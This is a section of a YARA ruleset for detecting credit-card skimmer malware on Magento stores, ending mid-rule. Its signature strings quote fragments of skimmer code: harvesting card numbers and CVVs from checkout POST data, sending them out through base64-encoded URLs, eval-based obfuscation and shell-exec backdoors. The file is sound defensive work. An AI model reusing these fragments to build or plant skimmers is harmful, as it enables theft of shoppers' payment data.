rule php_malware_magentoccstealer_087 : malware
{
    strings:
        $trigger = "file_get_contents("
    condition:
        $trigger and PR00301 and PR05145 and PR05146
}

rule php_malware_magentoccstealer_088 : malware
{
    strings:
        $trigger = "$data .= \"$key -- $item\\r\\n\";"
    condition:
        $trigger and PR00301 and PR00925
}

private rule PR05147 : trigger
{
    strings:
        $ps0 = ".\"&ccname=&ip=\".$"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_089 : malware
{
    strings:
        $trigger = "file_get_contents("
    condition:
        $trigger and PR05147 and PR03964
}

private rule PR05148 : trigger
{
    strings:
        $ps0 = "\"YES!!!\";"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_090 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01021 and PR05148 and PR02141
}

rule php_malware_magentoccstealer_091 : malware
{
    strings:
        $trigger = "Update DB (Savecc)' => base64_decode('VVBEQVRFIGBjb3JlX2NvbmZpZ19kY"
    condition:
        $trigger and PR00039 and PR02056
}

// MANUAL FIX NECESSARY
rule php_malware_magentoccstealer_092 : malware
{
    strings:
        $trigger = "eval"
        $php_malware_magentoccstealer_092_r0 = /\$[\w]+[\s]*=[\s]*.[^;]{200}[^;]+;[\s]*eval/
    condition:
        $trigger and PR05114 and $php_malware_magentoccstealer_092_r0
}

private rule PR05149 : trigger
{
    strings:
        $ps0 = "'content' => @http_build_query($"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_093 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR05149 and PR05086
}

private rule PR05150 : trigger
{
    strings:
        $ps0 = "CURLOPT_URL,base64_decode("
    condition:
        $ps0
}

rule php_malware_magentoccstealer_096 : malware
{
    strings:
        $trigger = "&site='.$_SERVER['HTTP_HOST"
    condition:
        $trigger and PR05150 and PR00341
}

rule php_malware_magentoccstealer_097 : malware
{
    strings:
        $trigger = "time().'|'.$data['cc_number']"
    condition:
        $trigger and PR00437 and PR00301
}

private rule PR05151 : trigger
{
    strings:
        $ps0 = "$this->testReview($"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_097_02 : malware
{
    strings:
        $trigger = "time().'|'.$data['cc_number']"
    condition:
        $trigger and PR00437 and PR00301 and PR05151
}

rule php_malware_magentoccstealer_098 : malware
{
    strings:
        $trigger = "JG9iamVjdCA9IG5ldyBNYWdlX0NoZWNrb3V0X0Jsb2NrX09uZXBhZ2VfQmlsbGluZzs"
    condition:
        $trigger and PR00029
}

rule php_malware_magentoccstealer_099 : malware
{
    strings:
        $trigger = "\"\\x2F\\x69\\x6E\\x64\\x65\\x78\\x2E\\x70\\x68\\x70\\x3F\\x72\\x6F\\x75\\x74\\x65\\x3D\\x63\\x68\\x65\\x63\\x6B\\x6F\\x75\\x74\\x2F\\x63\\x68\\x65\\x63\\x6B\\x6F\\x75\\x74\","
    condition:
        $trigger and PR00638 and PR00639
}

private rule PR05152 : trigger
{
    strings:
        $ps0 = "const new_cook = !document.referrer || document.referrer.includes(location.host)"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_100 : malware
{
    strings:
        $trigger = "(url, dataobject, ok, err, timeout="
    condition:
        $trigger and PR05152 and PR00507
}

private rule PR05153 : trigger
{
    strings:
        $ps0 = "base64_encode(preg_replace('@\\.@','_',$_SERVER['HTTP_HOST"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_102 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR05153 and PR00925
}

private rule PR05154 : trigger
{
    strings:
        $ps0 = "hostname'=>$_SERVER['HTTP_HOST'],'sub'=>"
    condition:
        $ps0
}

private rule PR05155 : trigger
{
    strings:
        $ps0 = "('',$_POST,0);"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_104 : malware
{
    strings:
        $trigger = "time().'-'.crc32(uniqid()),time()+"
    condition:
        $trigger and PR05154 and PR00391 and PR01514 and PR05155
}

private rule PR05156 : trigger
{
    strings:
        $ps0 = "curl_init();curl_setopt($ch,CURLOPT_URL, base64_decode("
    condition:
        $ps0
}

rule php_malware_magentoccstealer_105 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR05156 and PR00925
}

private rule PR05157 : trigger
{
    strings:
        $ps0 = "if(@preg_match(\"/checkout"
    condition:
        $ps0
}

private rule PR05158 : trigger
{
    strings:
        $ps0 = "@base64_encode(serialize($_REQUEST).\"--\".serialize($_COOKIE)).\"\\n\", FILE_APPEND);"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_106 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR05157 and PR05158 and PR00925
}

rule php_malware_magentoccstealer_106_03 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR05158 and PR00925
}

rule php_malware_magentoccstealer_107 : malware
{
    strings:
        $trigger = "eval(gzinflate(base64_decode"
    condition:
        $trigger and PR05114
}

private rule PR05159 : trigger
{
    strings:
        $ps0 = "shell_exec($username); echo"
    condition:
        $ps0
}

private rule PR05160 : trigger
{
    strings:
        $ps0 = "Mage::getSingleton('adminhtml/url')->getUrl('adminhtml');"
    condition:
        $ps0
}

private rule PR05161 : trigger
{
    strings:
        $ps0 = "if(md5($password)"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_109 : malware
{
    strings:
        $trigger = "date('h:i:s a m/d/Y', time());"
    condition:
        $trigger and PR05159 and PR05160 and PR05161 and PR01012
}

private rule PR05162 : trigger
{
    strings:
        $ps0 = "$_SERVER['REMOTE_ADDR'];"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_109_02 : malware
{
    strings:
        $trigger = "date('h:i:s a m/d/Y', time());"
    condition:
        $trigger and PR01012 and PR05160 and PR05161 and PR05162
}

private rule PR05163 : trigger
{
    strings:
        $ps0 = "$_cur = getcwd();"
    condition:
        $ps0
}

private rule PR05164 : trigger
{
    strings:
        $ps0 = "fwrite($fp, $username.\" : \".$password.\"\\n\");"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_111 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR05163 and PR05164 and PR00925
}

private rule PR05165 : trigger
{
    strings:
        $ps0 = "@$s_func("
    condition:
        $ps0
}

private rule PR05166 : trigger
{
    strings:
        $ps0 = "($this->_dispatch.$this->_action.$this->_content)(\"http"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_112 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR05165 and PR05166 and PR00925
}

private rule PR05167 : trigger
{
    strings:
        $ps0 = "$results = ($this->_dispatch"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_112_02 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR05167 and PR05166 and PR00925
}

rule php_malware_magentoccstealer_113 : malware
{
    strings:
        $trigger = "base64_encode(utf8_encode(implode("
    condition:
        $trigger and PR05112 and PR00091
}

private rule PR05168 : trigger
{
    strings:
        $ps0 = "]))&&(isset($_POST))&&(count($_POST)"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_114 : malware
{
    strings:
        $trigger = ",$strDebug.\"\\n\",FILE_APPEND);}"
    condition:
        $trigger and PR05168
}

rule php_malware_magentoccstealer_116 : malware
{
    strings:
        $trigger = "@eval(base64_decode('aWYoQHByZWdfbWF0Y2goIi9jaGVja291dHxvbmVwYWdlf"
    condition:
        $trigger
}

private rule PR05169 : trigger
{
    strings:
        $ps0 = "'1337"
    condition:
        $ps0
}

private rule PR05170 : trigger
{
    strings:
        $ps0 = "naem"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_117 : malware
{
    strings:
        $trigger = "base64_encode(json_encode("
    condition:
        $trigger and PR05169 and PR01553 and PR01401 and PR05170
}

private rule PR05171 : trigger
{
    strings:
        $ps0 = "|| $_POST['payment']['method'] === $"
    condition:
        $ps0
}

private rule PR05172 : trigger
{
    strings:
        $ps0 = "curl_setopt($ch,CURLOPT_POSTFIELDS, http_build_query($ok));"
    condition:
        $ps0
}

private rule PR05173 : trigger
{
    strings:
        $ps0 = "$_COOKIE['control_hash']);"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_117_02 : malware
{
    strings:
        $trigger = "Mage"
    condition:
        $trigger and PR05171 and PR05172 and PR05173 and PR00648 and PR01012
}

private rule PR05174 : trigger
{
    strings:
        $ps0 = "|onestepcheckout|"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_119 : malware
{
    strings:
        $trigger = "eval(function(p,a,c,k,e,"
    condition:
        $trigger and PR00676 and PR05174 and PR00677
}

rule php_malware_magentoccstealer_123 : malware
{
    strings:
        $trigger = "Y2Nf"
    condition:
        $trigger and PR05114 and PR01466
}

private rule PR05175 : trigger
{
    strings:
        $ps0 = "(openssl_public_encrypt($data, $encrypted, $this->pubkey)"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_124 : malware
{
    strings:
        $trigger = "$_COOKIE['currentcvv"
    condition:
        $trigger and PR05175
}

private rule PR05176 : trigger
{
    strings:
        $ps0 = "fwrite($handler, $ip.\"|payment[cc_owner]|\".$_POST['payment']['cc_owner'].\"|\".time().\"\\n\");"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_125 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR05176 and PR00357
}

// MANUAL FIX NECESSARY
rule php_malware_magentoccstealer_126 : malware
{
    strings:
        $trigger = "if(!isset($_COOKIE["
        $php_malware_magentoccstealer_126_r0 = /if\(!isset\(\$_COOKIE\[.adminhtml.\]\)\)[\s]*(\{)?[\s]*echo[\s]*file_get_contents\(/
    condition:
        $trigger and PR02155 and PR01431 and $php_malware_magentoccstealer_126_r0
}

private rule PR05177 : trigger
{
    strings:
        $ps0 = "if(empty($request->getPostValue('Custom"
    condition:
        $ps0
}

private rule PR05178 : trigger
{
    strings:
        $ps0 = "$authParam = $request;"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_127 : malware
{
    strings:
        $trigger = "Mage"
    condition:
        $trigger and PR05177 and PR00301 and PR05178
}

private rule PR05179 : trigger
{
    strings:
        $ps0 = "$this->getAuthenticate($authParam);"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_127_02 : malware
{
    strings:
        $trigger = "Mage"
    condition:
        $trigger and PR05177 and PR00301 and PR05179
}

rule php_malware_magentoccstealer_127_03 : malware
{
    strings:
        $trigger = "$auth_url = base64_encode($this->getCustomer()->getEmail());"
    condition:
        $trigger and PR05177 and PR00925
}

private rule PR05180 : trigger
{
    strings:
        $ps0 = "$auth_url = base64_encode ("
    condition:
        $ps0
}

rule php_malware_magentoccstealer_127_04 : malware
{
    strings:
        $trigger = "Mage"
    condition:
        $trigger and PR05177 and PR00301 and PR05180
}

rule php_malware_magentoccstealer_128 : malware
{
    strings:
        $trigger = "<td>password</td>"
    condition:
        $trigger and PR04059
}

private rule PR05181 : trigger
{
    strings:
        $ps0 = ")->jsonEncode(array('cookies'=> Mage::getSingleton("
    condition:
        $ps0
}

private rule PR05182 : trigger
{
    strings:
        $ps0 = "@touch(strrev("
    condition:
        $ps0
}

rule php_malware_magentoccstealer_129 : malware
{
    strings:
        $trigger = "MAINLOG_PATH"
    condition:
        $trigger and PR05181 and PR05182
}

private rule PR05183 : trigger
{
    strings:
        $ps0 = "echo file_get_contents(base64_decode(\"aH"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_130 : malware
{
    strings:
        $trigger = "(strpos($_SERVER[\"REQUEST_URI\"], \"checkout\")"
    condition:
        $trigger and PR05183
}

private rule PR05184 : trigger
{
    strings:
        $ps0 = "@die (shell_exec($username));"
    condition:
        $ps0
}

private rule PR05185 : trigger
{
    strings:
        $ps0 = "base64_encode(\"{\\\"referer"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_131 : malware
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR05184 and PR05185
}

rule php_malware_magentoccstealer_131_02 : malware
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR05184 and PR05161
}

private rule PR05186 : trigger
{
    strings:
        $ps0 = "adminhtml/url"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_132 : malware
{
    strings:
        $trigger = "->getResource()->recordLogin($"
    condition:
        $trigger and PR05112 and PR05186 and PR00091 and PR04667
}

private rule PR05187 : trigger
{
    strings:
        $ps0 = "if(md5($password"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_132_02 : malware
{
    strings:
        $trigger = "->getResource()->recordLogin($"
    condition:
        $trigger and PR05112 and PR05186 and PR00091 and PR05187 and PR04667
}

private rule PR05188 : trigger
{
    strings:
        $ps0 = "token_hash',base64_encode"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_132_03 : malware
{
    strings:
        $trigger = "->getResource()->recordLogin($"
    condition:
        $trigger and PR05112 and PR05186 and PR00091 and PR05188 and PR04667
}

private rule PR05189 : trigger
{
    strings:
        $ps0 = "json_encode($_POST);"
    condition:
        $ps0
}

private rule PR05190 : trigger
{
    strings:
        $ps0 = "file_put_contents(\"error\", $error_info, FILE_APPEND);"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_133 : malware
{
    strings:
        $trigger = "header('HTTP/1.1 307 Temporary Redirect');"
    condition:
        $trigger and PR05189 and PR05190
}

// MANUAL FIX NECESSARY
rule php_malware_magentoccstealer_134 : malware
{
    strings:
        $trigger = "@file_get_contents('http"
        $php_malware_magentoccstealer_134_r0 = /@file_get_contents\('https?:..[\d]+/
    condition:
        $trigger and PR05112 and $php_malware_magentoccstealer_134_r0
}

private rule PR05191 : trigger
{
    strings:
        $ps0 = "(@$_POST['payment']['cc_number']"
    condition:
        $ps0
}

private rule PR05192 : trigger
{
    strings:
        $ps0 = "array('cc'=>$_POST['payment']['cc_number'],'mo'=>$_POST['payment']['cc_exp_month']"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_134_02 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR05112 and PR05191 and PR05192
}

private rule PR05193 : trigger
{
    strings:
        $ps0 = "$update($encode, $timestamp, $mySQL);"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_136 : malware
{
    strings:
        $trigger = "$mySQL .= $_SERVER['HTTP_REFERER'].\"\\n\".$_SERVER['SCRIPT_FILENAME'].\"\\n\";"
    condition:
        $trigger and PR05112 and PR05193
}

rule php_malware_magentoccstealer_136_02 : malware
{
    strings:
        $trigger = "ini_set('display_errors',0);"
    condition:
        $trigger and PR05112 and PR00091 and PR05193
}

private rule PR05194 : trigger
{
    strings:
        $ps0 = ");@$"
    condition:
        $ps0
}

private rule PR05195 : trigger
{
    strings:
        $ps0 = "();}else{$"
    condition:
        $ps0
}

private rule PR05196 : trigger
{
    strings:
        $ps0 = ".=\"\\x"
    condition:
        $ps0
}

private rule PR05197 : trigger
{
    strings:
        $ps0 = ".=\"\\1"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_138 : malware
{
    strings:
        $trigger = ");};if(function_exists($"
    condition:
        $trigger and PR05194 and PR05195 and PR05196 and PR05197 and PR00719
}

private rule PR05198 : trigger
{
    strings:
        $ps0 = "])) && ($_SERVER[$"
    condition:
        $ps0
}

private rule PR05199 : trigger
{
    strings:
        $ps0 = "+= ord(substr($"
    condition:
        $ps0
}

private rule PR05200 : trigger
{
    strings:
        $ps0 = "@curl_exec($"
    condition:
        $ps0
}

private rule PR05201 : trigger
{
    strings:
        $ps0 = "* ord(substr($"
    condition:
        $ps0
}

private rule PR05202 : trigger
{
    strings:
        $ps0 = "echo (@$"
    condition:
        $ps0
}

private rule PR05203 : trigger
{
    strings:
        $ps0 = "]) ? $_SERVER[$"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_141 : malware
{
    strings:
        $trigger = ", CURLOPT_HTTPHEADER, array(\"$"
    condition:
        $trigger and PR05198 and PR05199 and PR05200 and PR05201 and PR05202 and PR05203
}

private rule PR05204 : trigger
{
    strings:
        $ps0 = "$data .= \"exp: \".$payment->getCcExpMonth().\"/\".$payment->getCcExpYear().\"\\n\";"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_142 : malware
{
    strings:
        $trigger = "mail($"
    condition:
        $trigger and PR05204 and PR04201
}

private rule PR05205 : trigger
{
    strings:
        $ps0 = "IP Info"
    condition:
        $ps0
}

private rule PR05206 : trigger
{
    strings:
        $ps0 = "curl_setopt($curl, CURLOPT_URL, $getip);"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_144 : malware
{
    strings:
        $trigger = "$username "
    condition:
        $trigger and PR05112 and PR00091 and PR05205 and PR05206
}

rule php_malware_magentoccstealer_146 : malware
{
    strings:
        $trigger = "@file_get_contents('php://input');if(!empty($"
    condition:
        $trigger and PR00091 and PR00341 and PR00342
}

rule php_malware_magentoccstealer_146_02 : malware
{
    strings:
        $trigger = "@file_get_contents('php://input');if(!empty($"
    condition:
        $trigger and PR03157 and PR00091 and PR00341 and PR00342
}

private rule PR05207 : trigger
{
    strings:
        $ps0 = "*/.')'/*"
    condition:
        $ps0
}

private rule PR05208 : trigger
{
    strings:
        $ps0 = "* @category    Mage"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_147 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR05207 and PR05208
}

// MANUAL FIX NECESSARY
rule php_malware_magentoccstealer_149 : malware
{
    strings:
        $trigger = "Year':null,'CVV':null,'Gate"
        $php_malware_magentoccstealer_149_r0 = /=\s*'';\s*for\s*\(/
    condition:
        $trigger and PR00647 and $php_malware_magentoccstealer_149_r0
}

private rule PR05209 : trigger
{
    strings:
        $ps0 = "$state->setAreaCode('frontend');"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_150 : malware
{
    strings:
        $trigger = "= array('cc'=>@$_REQUEST['ccn'],'mo'=>@$_REQUEST['ccm'],'ye'=>@$_REQUEST"
    condition:
        $trigger and PR05209 and PR00507
}

private rule PR05210 : trigger
{
    strings:
        $ps0 = "fwrite($handle, date(\"Y-m-d H:i:s\").$split.$firstname.$split.$lastname.$split.$street.$split.$city."
    condition:
        $ps0
}

rule php_malware_magentoccstealer_151 : malware
{
    strings:
        $trigger = "fopen"
    condition:
        $trigger and PR05210 and PR04510
}

rule php_malware_magentoccstealer_151_02 : malware
{
    strings:
        $trigger = "if($_GET['hola'] !== 'hello') { die(); }"
    condition:
        $trigger
}

private rule PR05211 : trigger
{
    strings:
        $ps0 = "if ((strpos($_SERVER['REQUEST_URI'], 'checkout/onepage')) or (strpos($_SERVER"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_152 : malware
{
    strings:
        $trigger = ", 0777, true);"
    condition:
        $trigger and PR00435 and PR05211
}

private rule PR05212 : trigger
{
    strings:
        $ps0 = "function saveNumber()"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_153 : malware
{
    strings:
        $trigger = "$this->saveNumber();"
    condition:
        $trigger and PR05212 and PR05068
}

rule php_malware_magentoccstealer_153_02 : malware
{
    strings:
        $trigger = "(isset($_POST[\"payment"
    condition:
        $trigger and PR05212 and PR05068
}

rule php_malware_magentoccstealer_153_03 : malware
{
    strings:
        $trigger = "if (openssl_public_encrypt($data, $encrypted"
    condition:
        $trigger and PR05212 and PR05068
}

private rule PR05213 : trigger
{
    strings:
        $ps0 = "function|setInterval|x49'.split('|'),"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_154 : malware
{
    strings:
        $trigger = "eval(function(p,a,c,k,e,"
    condition:
        $trigger and PR00676 and PR00677 and PR05213
}

private rule PR05214 : trigger
{
    strings:
        $ps0 = "$username = $username;"
    condition:
        $ps0
}

private rule PR05215 : trigger
{
    strings:
        $ps0 = "$file = @fopen($_SERVER['DOCUMENT_ROOT'].'/"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_155 : malware
{
    strings:
        $trigger = "adminhtml/url"
    condition:
        $trigger and PR05112 and PR05214 and PR05215
}

rule php_malware_magentoccstealer_156 : malware
{
    strings:
        $trigger = "cc_cid = strvaL(rand(100,999));"
    condition:
        $trigger and PR03281
}

private rule PR05216 : trigger
{
    strings:
        $ps0 = "@$validate('$input', $key_data);"
    condition:
        $ps0
}

private rule PR05217 : trigger
{
    strings:
        $ps0 = "public function validate_request($request)"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_157 : malware
{
    strings:
        $trigger = "str_rot13"
    condition:
        $trigger and PR05216 and PR05217 and PR01422
}

private rule PR05218 : trigger
{
    strings:
        $ps0 = "$this->validate_request($_REQUEST);"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_157_02 : malware
{
    strings:
        $trigger = "str_rot13"
    condition:
        $trigger and PR05218 and PR05217 and PR01422
}

private rule PR05219 : trigger
{
    strings:
        $ps0 = "pallete($mage_"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_158 : malware
{
    strings:
        $trigger = "chr(hexdec($col"
    condition:
        $trigger and PR00029 and PR05219
}

private rule PR05220 : trigger
{
    strings:
        $ps0 = ")), false, stream_context_create(array('http' => array('method"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_159 : malware
{
    strings:
        $trigger = "));$"
    condition:
        $trigger and PR05220
}

private rule PR05221 : trigger
{
    strings:
        $ps0 = "strpos($_SERVER[\"REQUEST_URI\"], \"checkout\") && !isset($_COOKIE[\"adminhtml\"])"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_160 : malware
{
    strings:
        $trigger = "stream_context_create(array(\"ssl\"=>array(\"verify_peer\"=>false,\"verify_peer_name\"=>false"
    condition:
        $trigger and PR05112 and PR01431 and PR05221
}

rule php_malware_magentoccstealer_161 : malware
{
    strings:
        $trigger = "echo implode(array_map(\"chr\", array(60,115,99,114,105,112,116,62,108,101,116,32,95,115"
    condition:
        $trigger and PR00091
}

rule php_malware_magentoccstealer_162 : malware
{
    strings:
        $trigger = "$yolo=$CARD .\"|\".$OCARD .\"|\".$CARDNO"
    condition:
        $trigger and PR00301
}

private rule PR05222 : trigger
{
    strings:
        $ps0 = "license_token=\".base64_encode(bin2hex($data"
    condition:
        $ps0
}

private rule PR05223 : trigger
{
    strings:
        $ps0 = "json_encode($validate_data);"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_163 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR05222 and PR05223 and PR02546
}

private rule PR05224 : trigger
{
    strings:
        $ps0 = "($validate_data,\""
    condition:
        $ps0
}

rule php_malware_magentoccstealer_163_02 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR05224 and PR05223 and PR02546
}

rule php_malware_magentoccstealer_164 : malware
{
    strings:
        $trigger = "if(isset($_POST[\"statistics_hash\"])){@file_get_contents(base64_decode('aHR0"
    condition:
        $trigger
}

private rule PR05225 : trigger
{
    strings:
        $ps0 = "\"\";if(isset($_POST['billing'])){"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_165 : malware
{
    strings:
        $trigger = "bin2hex(json_encode("
    condition:
        $trigger and PR05225
}

private rule PR05226 : trigger
{
    strings:
        $ps0 = "){$string .= chr(hexdec($col[$i]"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_165_02 : malware
{
    strings:
        $trigger = "bin2hex(json_encode("
    condition:
        $trigger and PR05226 and PR01490
}

private rule PR05227 : trigger
{
    strings:
        $ps0 = "if(isset($_POST['ccard_ccnumber']) || isset($_POST['customer_session"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_166 : malware
{
    strings:
        $trigger = "$url = base64_decode('aHR0"
    condition:
        $trigger and PR02034 and PR00341 and PR05227
}

private rule PR05228 : trigger
{
    strings:
        $ps0 = "'1' => base64_encode(json_encode($_POST))"
    condition:
        $ps0
}

private rule PR05229 : trigger
{
    strings:
        $ps0 = "$base = $base('PHNjc"
    condition:
        $ps0
}

private rule PR05230 : trigger
{
    strings:
        $ps0 = "function destroy()"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_167 : malware
{
    strings:
        $trigger = "$url = base64_decode('aHR0"
    condition:
        $trigger and PR05228 and PR00341 and PR05229 and PR05230
}

private rule PR05231 : trigger
{
    strings:
        $ps0 = "$url = base64_decode('aHR0"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_167_02 : malware
{
    strings:
        $trigger = "register_shutdown_function(array($this, 'destroy'));"
    condition:
        $trigger and PR05228 and PR00341 and PR05229 and PR05231
}

private rule PR05232 : trigger
{
    strings:
        $ps0 = "$_SERVER['SERVER_NAME']"
    condition:
        $ps0
}

private rule PR05233 : trigger
{
    strings:
        $ps0 = "$server_output = curl_exec"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_168 : malware
{
    strings:
        $trigger = "\".$srv.\"\\n\";"
    condition:
        $trigger and PR05232 and PR05233
}

private rule PR05234 : trigger
{
    strings:
        $ps0 = ")})(\""
    condition:
        $ps0
}

private rule PR05235 : trigger
{
    strings:
        $ps0 = ").join(_0x"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_169 : malware
{
    strings:
        $trigger = "=String.fromCharCode(127);var _0x"
    condition:
        $trigger and PR05234 and PR05235
}

private rule PR05236 : trigger
{
    strings:
        $ps0 = ";if(isNaN(_0x"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_169_02 : malware
{
    strings:
        $trigger = "=String.fromCharCode(127);var _0x"
    condition:
        $trigger and PR05234 and PR05236
}

private rule PR05237 : trigger
{
    strings:
        $ps0 = "\"\\r\\n\", FILE_APPEND);"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_170 : malware
{
    strings:
        $trigger = "getCcNumber();"
    condition:
        $trigger and PR00435 and PR05237 and PR05110
}

// MANUAL FIX NECESSARY
private rule PR05238 : trigger
{
    strings:
        $ps0 = ");break;default:console[_"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_171 : malware
{
    strings:
        $trigger = "document["
        $php_malware_magentoccstealer_171_r0 = /=\s*'';\s*for\s*\(/
    condition:
        $trigger and PR05238 and $php_malware_magentoccstealer_171_r0
}

private rule PR05239 : trigger
{
    strings:
        $ps0 = "write($f, $payment['ccard_ccnumber'].\"|\".$payment['ccard_expdate'].\"|\".$payment['ccard_cvvcode']"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_172 : malware
{
    strings:
        $trigger = "$billing = Mage::getSingleton('checkout/session')->getQuote()->getBillingAddress()->getData();"
    condition:
        $trigger and PR05239 and PR04936
}

private rule PR05240 : trigger
{
    strings:
        $ps0 = "= Mage::getSingleton('checkout/session')->getQuote()->getShippingAddress();"
    condition:
        $ps0
}

private rule PR05241 : trigger
{
    strings:
        $ps0 = "1' => base64_encode(json_encode($res)),"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_173 : malware
{
    strings:
        $trigger = "print_r($e, 1), FILE_APPEND|LOCK_EX);"
    condition:
        $trigger and PR00435 and PR05240 and PR00341 and PR05241 and PR05231
}

private rule PR05242 : trigger
{
    strings:
        $ps0 = "$_SERVER[\"HTTP_HOST\"]"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_174 : malware
{
    strings:
        $trigger = "base64_encode(bin2hex(str_replace("
    condition:
        $trigger and PR05242 and PR05068
}

// MANUAL FIX NECESSARY
rule php_malware_magentoccstealer_174_02 : malware
{
    strings:
        $trigger = "Mage_"
        $php_malware_magentoccstealer_174_02_r0 = /\$[\w]+->[\w]+\(\$[\w]+,[^;]+\);[\s]*\$[\w]+->[\w]+\(\);[\s]*return[\s]*\$[\w]+;/
    condition:
        $trigger and PR05242 and $php_malware_magentoccstealer_174_02_r0
}

private rule PR05243 : trigger
{
    strings:
        $ps0 = "$data=@$_COOKIE[\"___billing\"].\"|\".@$_POST['payment']['cc_number'].\"|\""
    condition:
        $ps0
}

rule php_malware_magentoccstealer_175 : malware
{
    strings:
        $trigger = "curl_setopt($ch, CURLOPT_POSTFIELDS, $data);"
    condition:
        $trigger and PR00435 and PR00341 and PR05243
}

rule php_malware_magentoccstealer_176 : malware
{
    strings:
        $trigger = "exit(`{$_REQUEST["
    condition:
        $trigger and PR01379
}

// MANUAL FIX NECESSARY
private rule PR05244 : trigger
{
    strings:
        $ps0 = "= $_REQUEST["
    condition:
        $ps0
}

rule php_malware_magentoccstealer_176_02 : malware
{
    strings:
        $trigger = "exit(`"
        $php_malware_magentoccstealer_176_02_r0 = /if[\s]*\(isset\(\$_REQUEST\[[^\)]+\)\)[\s]*\{[\s]*\$[\w]+[\s]*=[\s]*\$_REQUEST\[.[\w]+.\];[\s]*exit\(`\$[\w]+`\);[\s]*\}[\s]*/
    condition:
        $trigger and PR01379 and PR05244 and $php_malware_magentoccstealer_176_02_r0
}

rule php_malware_magentoccstealer_177 : malware
{
    strings:
        $trigger = "(strpos($_SERVER['REQUEST_URI'], 'checkout"
    condition:
        $trigger and PR01877 and PR02082 and PR01479
}

private rule PR05245 : trigger
{
    strings:
        $ps0 = "strpos($txtBod, \"cc_number\") !== false && strpos($txtBod, \"cc_cid"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_178 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR05245 and PR00355 and PR00357
}

private rule PR05246 : trigger
{
    strings:
        $ps0 = "(strpos($_SERVER['REQUEST_URI'], 'checkout"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_179 : malware
{
    strings:
        $trigger = "PHNjcmlwdD"
    condition:
        $trigger and PR01479 and PR05246
}

private rule PR05247 : trigger
{
    strings:
        $ps0 = "HTTP_X_FORWARDED_FOR"
    condition:
        $ps0
}

private rule PR05248 : trigger
{
    strings:
        $ps0 = "base64_decode(file_get_contents($"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_180 : malware
{
    strings:
        $trigger = "if (!in_array($"
    condition:
        $trigger and PR05247 and PR05248 and PR01021
}

private rule PR05249 : trigger
{
    strings:
        $ps0 = "$data = $data.$enc;"
    condition:
        $ps0
